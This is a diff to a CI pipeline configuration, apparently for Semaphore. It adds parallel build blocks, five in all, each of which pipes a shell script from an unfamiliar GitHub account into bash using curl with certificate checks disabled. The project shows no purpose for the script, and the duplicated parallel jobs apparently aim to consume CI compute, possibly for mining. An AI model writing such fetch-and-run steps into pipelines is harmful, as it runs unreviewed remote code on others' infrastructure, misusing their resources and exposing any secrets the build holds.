@@ -10,4 +10,33 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash
+            - 'curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash'
+    dependencies: []
+  - name: 'Block #2'
+    dependencies: []
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash'
+  - name: 'Block #3'
+    dependencies: []
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash'
+  - name: 'Block #4'
+    dependencies: []
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash'
+  - name: 'Block #5'
+    dependencies: []
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash'
